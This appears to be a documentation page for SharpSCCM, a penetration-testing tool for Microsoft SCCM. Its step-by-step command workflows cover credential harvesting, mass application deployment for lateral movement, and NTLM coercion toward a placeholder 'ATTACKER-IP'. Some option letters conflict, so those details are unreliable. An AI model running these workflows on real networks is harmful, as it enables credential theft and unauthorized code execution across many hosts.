@@ -1,0 +1,726 @@
+---
+title: 'Command Line Usage'
+description: 'Comprehensive guide to SharpSCCM command-line syntax, options, and usage patterns'
+icon: 'terminal'
+sidebarTitle: 'Command Line Usage'
+---
+
+<Info>
+  **Built-in Help**: All commands and subcommands include automatically generated help pages accessible with `-h`, `--help`, `/h`, `/?`, or `-?`
+</Info>
+
+## Basic Syntax
+
+<CodeGroup>
+```bash General Syntax
+SharpSCCM.exe [command] [subcommand] [options]
+```
+
+```bash Example Commands
+# Information gathering
+SharpSCCM.exe get site-info
+
+# Credential extraction
+SharpSCCM.exe get secrets -mp SCCM01.corp.local -sc PS1
+
+# Command execution
+SharpSCCM.exe exec -d WORKSTATION01 -p "cmd.exe /c whoami"
+
+# Local operations
+SharpSCCM.exe local secrets -m wmi
+```
+</CodeGroup>
+
+## Global Options
+
+<AccordionGroup>
+  <Accordion title="Common Global Options" icon="gear">
+    These options are available across most SharpSCCM commands:
+
+    | Option | Description | Example |
+    |--------|-------------|---------|
+    | `-sms, --sms-provider` | SMS Provider server | `-sms SCCM01.corp.local` |
+    | `-mp, --management-point` | Management Point server | `-mp SCCM01.corp.local` |
+    | `-sc, --site-code` | Three-character site code | `-sc PS1` |
+    | `--debug` | Enable debug output | `--debug` |
+    | `--no-banner` | Suppress banner output | `--no-banner` |
+    | `-?, -h, --help` | Display help information | `--help` |
+  </Accordion>
+
+  <Accordion title="Output Control Options" icon="eye">
+    Control how SharpSCCM displays information:
+
+    | Option | Description | Usage |
+    |--------|-------------|-------|
+    | `-v, --verbose` | Display all properties | Detailed output |
+    | `-c, --count` | Return count of results | Numerical summary |
+    | `-z, --dry-run` | Show queries without execution | Testing syntax |
+    | `-j, --json` | JSON output format | Machine-readable output |
+    | `-o, --output-file` | Save output to file | Results archival |
+  </Accordion>
+
+  <Accordion title="Connection Options" icon="wifi">
+    Configure how SharpSCCM connects to SCCM infrastructure:
+
+    | Option | Description | Notes |
+    |--------|-------------|-------|
+    | `-sms` | SMS Provider address | Can be IP, FQDN, or NetBIOS name |
+    | `-mp` | Management Point address | Usually same as SMS Provider |
+    | `-sc` | Site code | Auto-detected if not specified |
+    | `-n, --wmi-namespace` | WMI namespace | Custom namespace targeting |
+  </Accordion>
+</AccordionGroup>
+
+## Command Categories
+
+<Tabs>
+  <Tab title="Information Gathering">
+    **`get` Command Group** - Extract information from SCCM infrastructure
+
+    <CodeGroup>
+    ```bash Site Discovery
+    # Discover site information via LDAP
+    SharpSCCM.exe get site-info -d corp.local
+
+    # Get current management point and site code
+    SharpSCCM.exe local site-info
+    ```
+
+    ```bash Administrative Discovery
+    # List SCCM administrators
+    SharpSCCM.exe get admins -sms SCCM01
+
+    # Get client push installation settings
+    SharpSCCM.exe get site-push-settings
+    ```
+
+    ```bash Asset Discovery
+    # Enumerate devices
+    SharpSCCM.exe get devices -n WORKSTATION
+
+    # List applications
+    SharpSCCM.exe get applications
+
+    # Discover collections
+    SharpSCCM.exe get collections -n "Domain Computers"
+    ```
+    </CodeGroup>
+
+    **Common Parameters:**
+    - `-n, --name`: Filter by name pattern
+    - `-p, --properties`: Specify properties to retrieve
+    - `-w, --where-condition`: Custom WQL WHERE clause
+    - `-o, --order-by`: Sort results
+  </Tab>
+
+  <Tab title="Credential Extraction">
+    **`get secrets` / `local secrets`** - Extract stored credentials
+
+    <CodeGroup>
+    ```bash Remote Credential Extraction
+    # Get NAA credentials from management point
+    SharpSCCM.exe get secrets -mp SCCM01.corp.local
+
+    # Use specific client identity
+    SharpSCCM.exe get secrets -c <certificate> -i <client-id>
+
+    # Register new device for access
+    SharpSCCM.exe get secrets -r NEWDEVICE -u COMPUTER$ -p password
+    ```
+
+    ```bash Local Credential Extraction
+    # Extract from local WMI repository
+    SharpSCCM.exe local secrets -m wmi
+
+    # Extract from CIM repository files (historical)
+    SharpSCCM.exe local secrets -m disk
+
+    # Escalate to SYSTEM for extraction
+    SharpSCCM.exe local secrets -m wmi -s
+    ```
+    </CodeGroup>
+
+    **Key Options:**
+    - `-m, --method`: Extraction method (wmi/disk)
+    - `-s, --get-system`: Escalate to SYSTEM
+    - `-o, --output-file`: Save credentials to file
+    - `-r, --register-client`: Register new client
+  </Tab>
+
+  <Tab title="Lateral Movement">
+    **`exec` Command** - Execute code on remote systems
+
+    <CodeGroup>
+    ```bash Command Execution
+    # Execute on specific device
+    SharpSCCM.exe exec -d WORKSTATION01 -p "cmd.exe /c whoami"
+
+    # Execute on collection
+    SharpSCCM.exe exec -n "Domain Computers" -p "powershell.exe -c Get-Process"
+
+    # Execute as specific user
+    SharpSCCM.exe exec -u CORP\user -p "notepad.exe"
+    ```
+
+    ```bash NTLM Coercion
+    # Coerce authentication from client
+    SharpSCCM.exe exec -d TARGET -r ATTACKER-IP
+
+    # Coerce from user's primary device
+    SharpSCCM.exe exec -u CORP\user -r 192.168.1.100
+    ```
+    </CodeGroup>
+
+    **Execution Options:**
+    - `-s, --run-as-system`: Execute as SYSTEM
+    - `-r, --run-as-user`: Execute as logged-on user
+    - `-w, --wait-time`: Execution timeout
+    - `-dir, --working-dir`: Working directory
+  </Tab>
+
+  <Tab title="Infrastructure Management">
+    **`new` / `remove` Commands** - Modify SCCM infrastructure
+
+    <CodeGroup>
+    ```bash Create Operations
+    # Create application
+    SharpSCCM.exe new application -n "MyApp" -p "cmd.exe"
+
+    # Create collection
+    SharpSCCM.exe new collection -n "TestCollection" -t device
+
+    # Create deployment
+    SharpSCCM.exe new deployment -a "MyApp" -c "TestCollection"
+    ```
+
+    ```bash Delete Operations
+    # Remove application
+    SharpSCCM.exe remove application "MyApp"
+
+    # Delete collection
+    SharpSCCM.exe remove collection -n "TestCollection"
+
+    # Remove deployment
+    SharpSCCM.exe remove deployment "MyApp_Install"
+    ```
+    </CodeGroup>
+
+    **Management Options:**
+    - `-n, --name`: Object name
+    - `-t, --type`: Object type (device/user)
+    - `-w, --wait-time`: Wait for operation completion
+  </Tab>
+
+  <Tab title="Advanced Operations">
+    **`invoke` Command Group** - Advanced SCCM operations
+
+    <CodeGroup>
+    ```bash CMPivot Queries
+    # Query via AdminService API
+    SharpSCCM.exe invoke admin-service -q "IPConfig" -r 16777226
+
+    # Query collection
+    SharpSCCM.exe invoke admin-service -q "Processes" -i SMS00001
+
+    # JSON output
+    SharpSCCM.exe invoke admin-service -q "EventLog('Security')" -r 16777226 -j
+    ```
+
+    ```bash Authentication Coercion
+    # Client push coercion
+    SharpSCCM.exe invoke client-push -t ATTACKER-IP
+
+    # Force policy updates
+    SharpSCCM.exe invoke update -i SMS00001
+    ```
+    </CodeGroup>
+
+    **Advanced Options:**
+    - `-q, --query`: CMPivot query string
+    - `-d, --delay`: Request delay
+    - `-re, --retries`: Retry attempts
+    - `-a, --as-admin`: Administrative connection
+  </Tab>
+</Tabs>
+
+## Site Configuration
+
+<Warning>
+  **Auto-Detection**: SharpSCCM automatically detects site configuration when possible. Manual specification is only required in complex environments or when targeting specific infrastructure.
+</Warning>
+
+### Automatic Site Discovery
+
+<Steps>
+  <Step title="Local Client Configuration">
+    SharpSCCM first attempts to read local SCCM client configuration:
+
+    ```bash
+    # Check local site information
+    SharpSCCM.exe local site-info
+    ```
+
+    This reads from the local WMI repository at `\\127.0.0.1\root\CCM`.
+  </Step>
+
+  <Step title="Management Point Detection">
+    If local configuration is available, SharpSCCM uses the current management point:
+
+    ```text
+    Current management point: SCCM01.corp.local
+    Site code: PS1
+    ```
+  </Step>
+
+  <Step title="SMS Provider Location">
+    The SMS Provider role may be hosted separately from management points. Use site discovery to identify it:
+
+    ```bash
+    SharpSCCM.exe get site-info -d corp.local
+    ```
+  </Step>
+</Steps>
+
+### Manual Configuration
+
+<Accordion title="When Manual Configuration is Needed">
+  **Scenarios requiring manual configuration:**
+  - Non-domain joined systems
+  - SCCM client not installed
+  - Targeting different sites
+  - SMS Provider on separate server
+  - Cross-domain operations
+
+  **Manual specification examples:**
+  ```bash
+  # Specify SMS Provider and site code
+  SharpSCCM.exe get admins -sms SCCM01.corp.local -sc PS1
+
+  # Different management point
+  SharpSCCM.exe get secrets -mp MP01.corp.local -sc PS1
+
+  # Cross-domain targeting
+  SharpSCCM.exe get site-info -d external.corp.local
+  ```
+</Accordion>
+
+## Authentication & Permissions
+
+<Tabs>
+  <Tab title="Authentication Methods">
+    **Integrated Windows Authentication (Default)**
+    ```bash
+    # Uses current user context
+    SharpSCCM.exe get admins
+    ```
+
+    **Computer Account Authentication**
+    ```bash
+    # For credential extraction
+    SharpSCCM.exe get secrets -u COMPUTER$ -p password -r NEWDEVICE
+    ```
+
+    **Certificate-Based Authentication**
+    ```bash
+    # Using existing certificate
+    SharpSCCM.exe get secrets -c <cert-blob> -i <client-id>
+    ```
+
+    **Elevated Privileges**
+    ```bash
+    # Local elevation for credential extraction
+    SharpSCCM.exe local secrets -m wmi -s
+    ```
+  </Tab>
+
+  <Tab title="Required Permissions">
+    **Minimum Permissions by Operation:**
+
+    | Operation | Required Role | Additional Requirements |
+    |-----------|---------------|------------------------|
+    | Site discovery | Domain User | LDAP read access |
+    | Information gathering | Read-only Analyst | SMS Admins local group |
+    | Credential extraction | None | Local admin or computer account |
+    | Application deployment | Application Administrator | Collection permissions |
+    | Infrastructure modification | Full Administrator | Site modification rights |
+    | CMPivot queries | CMPivot Operator | Read permissions + CMPivot scope |
+
+    **Permission Escalation:**
+    - Start with read-only operations
+    - Use extracted credentials for privileged operations
+    - Leverage SCCM roles for lateral movement
+  </Tab>
+
+  <Tab title="Environment Targeting">
+    **Lab Environment (Recommended)**
+    ```bash
+    # Safe information gathering
+    SharpSCCM.exe get site-info --dry-run
+    SharpSCCM.exe local client-info
+    SharpSCCM.exe get collections -c
+    ```
+
+    **Production Environment (Authorized Only)**
+    ```bash
+    # Read-only operations
+    SharpSCCM.exe get admins --no-banner
+    SharpSCCM.exe get devices -c
+
+    # Credential extraction (non-destructive)
+    SharpSCCM.exe local secrets -m wmi
+    ```
+
+    **Cleanup After Testing**
+    ```bash
+    # Remove created applications
+    SharpSCCM.exe remove application "TestApp"
+
+    # Delete test collections
+    SharpSCCM.exe remove collection -n "TestCollection"
+    ```
+  </Tab>
+</Tabs>
+
+## Common Usage Patterns
+
+<AccordionGroup>
+  <Accordion title="Basic Reconnaissance Workflow" icon="search">
+    **Step 1: Site Discovery**
+    ```bash
+    # Discover site infrastructure
+    SharpSCCM.exe get site-info -d corp.local
+    SharpSCCM.exe local site-info
+    ```
+
+    **Step 2: Administrative Enumeration**
+    ```bash
+    # List administrators and permissions
+    SharpSCCM.exe get admins -v
+    SharpSCCM.exe get site-push-settings
+    ```
+
+    **Step 3: Asset Discovery**
+    ```bash
+    # Enumerate managed assets
+    SharpSCCM.exe get devices -c
+    SharpSCCM.exe get collections
+    SharpSCCM.exe get applications -c
+    ```
+
+    **Step 4: Configuration Analysis**
+    ```bash
+    # Analyze security configuration
+    SharpSCCM.exe get deployments
+    SharpSCCM.exe local triage
+    ```
+  </Accordion>
+
+  <Accordion title="Credential Harvesting Workflow" icon="key">
+    **Step 1: Local Credential Extraction**
+    ```bash
+    # Extract from local WMI (if admin)
+    SharpSCCM.exe local secrets -m wmi
+
+    # Historical extraction from disk
+    SharpSCCM.exe local secrets -m disk
+    ```
+
+    **Step 2: Policy-Based Extraction**
+    ```bash
+    # Request policies from management point
+    SharpSCCM.exe get secrets
+
+    # With device registration
+    SharpSCCM.exe get secrets -r TESTDEVICE -u COMPUTER$ -p password
+    ```
+
+    **Step 3: Credential Validation**
+    ```bash
+    # Use extracted credentials for further enumeration
+    # (credentials would be used outside SharpSCCM)
+    ```
+  </Accordion>
+
+  <Accordion title="Lateral Movement Workflow" icon="arrows-alt">
+    **Step 1: Target Identification**
+    ```bash
+    # Find target devices
+    SharpSCCM.exe get devices -n WORKSTATION
+    SharpSCCM.exe get collection-members -n "Domain Computers"
+    ```
+
+    **Step 2: Application Deployment**
+    ```bash
+    # Create and deploy application
+    SharpSCCM.exe new application -n "TestApp" -p "cmd.exe /c whoami"
+    SharpSCCM.exe new deployment -a "TestApp" -c "Domain Computers"
+    ```
+
+    **Step 3: Direct Execution**
+    ```bash
+    # Execute on specific targets
+    SharpSCCM.exe exec -d WORKSTATION01 -p "powershell.exe -c Get-Process"
+    ```
+
+    **Step 4: Cleanup**
+    ```bash
+    # Remove artifacts
+    SharpSCCM.exe remove deployment "TestApp_Install"
+    SharpSCCM.exe remove application "TestApp"
+    ```
+  </Accordion>
+
+  <Accordion title="NTLM Coercion Workflow" icon="wifi">
+    **Step 1: Target Assessment**
+    ```bash
+    # Identify client push settings
+    SharpSCCM.exe get site-push-settings
+
+    # Find user primary devices
+    SharpSCCM.exe get primary-users -u targetuser
+    ```
+
+    **Step 2: Coercion Execution**
+    ```bash
+    # Client push coercion
+    SharpSCCM.exe invoke client-push -t ATTACKER-IP
+
+    # Client-based coercion
+    SharpSCCM.exe exec -d TARGET -r ATTACKER-IP
+    ```
+
+    **Step 3: Authentication Capture**
+    ```bash
+    # Capture would be handled by external tools
+    # (Responder, ntlmrelayx, etc.)
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Output Formats & Filtering
+
+<Tabs>
+  <Tab title="Output Control">
+    **Standard Output**
+    ```bash
+    # Default formatted output
+    SharpSCCM.exe get devices
+
+    # Verbose output with all properties
+    SharpSCCM.exe get devices -v
+
+    # Count only
+    SharpSCCM.exe get devices -c
+    ```
+
+    **File Output**
+    ```bash
+    # Save to file
+    SharpSCCM.exe get devices -o devices.txt
+
+    # JSON format
+    SharpSCCM.exe invoke admin-service -q "IPConfig" -r 16777226 -j
+    ```
+
+    **Quiet Operations**
+    ```bash
+    # Suppress banner
+    SharpSCCM.exe get devices --no-banner
+
+    # Debug information
+    SharpSCCM.exe get devices --debug
+    ```
+  </Tab>
+
+  <Tab title="Filtering & Querying">
+    **Name-Based Filtering**
+    ```bash
+    # Partial name matching
+    SharpSCCM.exe get devices -n WORKSTATION
+    SharpSCCM.exe get collections -n "Domain"
+    SharpSCCM.exe get applications -n "Office"
+    ```
+
+    **Property-Specific Queries**
+    ```bash
+    # Specific properties only
+    SharpSCCM.exe get devices -p Name -p LastLogonUserName
+
+    # Custom WHERE conditions
+    SharpSCCM.exe get devices -w "LastLogonUserName LIKE '%admin%'"
+    ```
+
+    **Advanced WQL Queries**
+    ```bash
+    # Custom queries via invoke
+    SharpSCCM.exe invoke query "SELECT Name FROM SMS_R_System WHERE Client=1"
+
+    # Dry run to test syntax
+    SharpSCCM.exe get devices -w "Invalid syntax" -z
+    ```
+  </Tab>
+
+  <Tab title="Result Ordering">
+    **Sorting Options**
+    ```bash
+    # Sort by name ascending
+    SharpSCCM.exe get devices -o "Name ASC"
+
+    # Sort by last logon descending
+    SharpSCCM.exe get devices -o "LastLogonTimestamp DESC"
+
+    # Multiple sort criteria
+    SharpSCCM.exe get collections -o "CollectionType ASC, Name ASC"
+    ```
+
+    **Pagination-Like Control**
+    ```bash
+    # Count results first
+    SharpSCCM.exe get devices -c
+
+    # Limit with WHERE clause
+    SharpSCCM.exe get devices -w "ResourceID < 17000000"
+    ```
+  </Tab>
+</Tabs>
+
+## Troubleshooting & Debugging
+
+<AccordionGroup>
+  <Accordion title="Connection Issues" icon="wifi">
+    **Symptoms**: Connection failures, authentication errors
+
+    **Diagnostic Commands**:
+    ```bash
+    # Test local connectivity
+    SharpSCCM.exe local site-info --debug
+
+    # Test specific server
+    SharpSCCM.exe get admins -sms SERVER --debug --dry-run
+
+    # Verify WMI connectivity
+    SharpSCCM.exe get classes -sms SERVER
+    ```
+
+    **Common Solutions**:
+    - Verify SCCM client is installed and functioning
+    - Check network connectivity to SMS Provider
+    - Validate user permissions and group membership
+    - Ensure proper site code and server names
+  </Accordion>
+
+  <Accordion title="Permission Errors" icon="lock">
+    **Symptoms**: Access denied, insufficient permissions
+
+    **Diagnostic Approach**:
+    ```bash
+    # Check current user context
+    whoami /groups
+
+    # Test with minimal permissions
+    SharpSCCM.exe get site-info --debug
+
+    # Verify SCCM role assignments
+    SharpSCCM.exe get admins | findstr %USERNAME%
+    ```
+
+    **Resolution Steps**:
+    - Add user to SMS Admins local group
+    - Assign appropriate SCCM security roles
+    - Use computer account for credential extraction
+    - Escalate privileges locally if needed
+  </Accordion>
+
+  <Accordion title="WQL Query Errors" icon="exclamation-triangle">
+    **Symptoms**: Invalid WQL syntax, query failures
+
+    **Testing Approach**:
+    ```bash
+    # Test query syntax with dry run
+    SharpSCCM.exe get devices -w "Invalid syntax" -z
+
+    # Validate WMI classes
+    SharpSCCM.exe get classes | findstr SMS_R_System
+
+    # Check class properties
+    SharpSCCM.exe get class-properties SMS_R_System
+    ```
+
+    **Best Practices**:
+    - Use dry run to validate syntax
+    - Start with simple queries
+    - Reference WMI class documentation
+    - Escape special characters properly
+  </Accordion>
+
+  <Accordion title="Output Issues" icon="eye">
+    **Symptoms**: No results, unexpected output
+
+    **Debugging Commands**:
+    ```bash
+    # Enable debug output
+    SharpSCCM.exe get devices --debug
+
+    # Check result count
+    SharpSCCM.exe get devices -c
+
+    # Use verbose output
+    SharpSCCM.exe get devices -v
+    ```
+
+    **Analysis Steps**:
+    - Verify query returned results with count option
+    - Check permissions for the queried objects
+    - Use verbose mode to see all available properties
+    - Review debug output for connection details
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<Steps>
+  <Step title="Start with Read-Only Operations">
+    Begin reconnaissance with safe, read-only commands:
+    ```bash
+    SharpSCCM.exe local site-info
+    SharpSCCM.exe get site-info -d corp.local
+    SharpSCCM.exe get admins -c
+    ```
+  </Step>
+
+  <Step title="Use Dry Run for Testing">
+    Test command syntax before execution:
+    ```bash
+    SharpSCCM.exe get devices -w "Complex WHERE clause" -z
+    SharpSCCM.exe invoke query "Custom WQL query" -z
+    ```
+  </Step>
+
+  <Step title="Document Your Activities">
+    Save output for analysis and documentation:
+    ```bash
+    SharpSCCM.exe get admins -v -o administrators.txt
+    SharpSCCM.exe get site-push-settings -o site-config.txt
+    ```
+  </Step>
+
+  <Step title="Clean Up After Operations">
+    Remove any created artifacts:
+    ```bash
+    SharpSCCM.exe remove application "TestApp"
+    SharpSCCM.exe remove collection -n "TestCollection"
+    ```
+  </Step>
+
+  <Step title="Monitor for Detection">
+    Be aware of potential detection points:
+    - SCCM audit logs
+    - Unusual WMI queries
+    - Administrative role usage
+    - Application deployment events
+  </Step>
+</Steps>
+
+<Note>
+  **Tab Completion**: SharpSCCM supports command-line tab completion with dotnet-suggest, but it's disabled by default to avoid creating temporary files. See the [command-line API documentation](https://github.com/dotnet/command-line-api/blob/main/docs/Features-overview.md) for more information.
+</Note>
